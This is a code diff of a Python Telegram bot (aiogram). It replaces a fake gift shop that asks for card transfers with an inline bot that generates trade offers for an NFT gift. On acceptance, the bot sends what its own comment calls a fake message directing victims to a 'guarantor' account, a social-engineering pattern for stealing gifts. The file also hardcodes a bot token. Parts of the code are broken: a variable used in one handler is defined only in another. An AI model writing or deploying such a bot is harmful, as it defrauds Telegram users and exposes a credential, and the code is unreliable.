@@ -1,60 +1,62 @@
 import asyncio
 import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = "8427894905:AAGzwZ9d-eot8oQujYfSbvlFqG4pYBQn4nI"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-@dp.message(Command("start"))
-async def start(message: types.Message):
+@dp.inline_query()
+async def inline_offer(query: types.InlineQuery):
+    # Замени на свою ссылку NFT и ник гаранта
+    nft_link = "https://t.me/nft/MirageLamp-97773"
+    guarantor = "@GiftLinkRelayer"
+    
+    text = (
+        f"✈️ **{query.from_user.first_name}** предлагает Вам\n\n"
+        f"50 💎 **gram** за подарок **MirageLamp #97773**.\n\n"
+        f"Предложение действует ещё 6ч 00м.\n\n"
+        f"{nft_link}"
+    )
+    
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎁 Купить подарок", callback_data="buy_gift")],
-        [InlineKeyboardButton(text="📦 Мои заказы", callback_data="my_orders")],
+        [
+            InlineKeyboardButton(text="Отклонить", callback_data="decline"),
+            InlineKeyboardButton(text="Принять", callback_data="accept")
+        ]
     ])
-    await message.answer(
-        "Добро пожаловать в магазин подарков!\n"
-        "У нас лучшие цены и быстрая доставка.",
-        reply_markup=kb,
+    
+    result = InlineQueryResultArticle(
+        id="offer_1",
+        title="Создать оффер",
+        description="Нажми, чтобы отправить предложение",
+        input_message_content=InputTextMessageContent(
+            message_text=text,
+            parse_mode="Markdown",
+            disable_web_page_preview=False
+        ),
+        reply_markup=kb
     )
+    
+    await query.answer([result], cache_time=1)
 
-@dp.callback_query(lambda c: c.data == "buy_gift")
-async def buy_gift(callback: types.CallbackQuery):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Оплатить 499₽", callback_data="pay_499")],
-        [InlineKeyboardButton(text="Оплатить 999₽", callback_data="pay_999")],
-        [InlineKeyboardButton(text="Назад", callback_data="back")],
-    ])
-    await callback.message.edit_text(
-        "Выберите подарок:\n"
-        "• Стандартный — 499₽\n"
-        "• Премиум — 999₽",
-        reply_markup=kb,
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data.startswith("pay_"))
-async def pay(callback: types.CallbackQuery):
-    amount = callback.data.split("_")[1]
-    await callback.message.edit_text(
-        f"Для оплаты {amount}₽ переведите сумму на карту:\n"
-        "`2200 0000 0000 0000`\n"
-        "После оплаты отправьте чек сюда.",
-        parse_mode="Markdown",
+@dp.callback_query(F.data == "accept")
+async def accept_offer(callback: types.CallbackQuery):
+    # Отправляем фейковое сообщение о переходе к гаранту
+    await callback.message.answer(
+        f"Передача выполняется через аккаунт сделки {guarantor}.\n"
+        "Подтвердите получение в системе.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Перейти к гаранту", url="https://t.me/GiftLinkRelayer")]
+        ])
     )
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "my_orders")
-async def my_orders(callback: types.CallbackQuery):
-    await callback.message.edit_text("У вас пока нет заказов.")
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "back")
-async def back(callback: types.CallbackQuery):
-    await start(callback.message)
+@dp.callback_query(F.data == "decline")
+async def decline_offer(callback: types.CallbackQuery):
+    await callback.message.edit_text("Вы отклонили предложение.")
     await callback.answer()
 
 async def main():
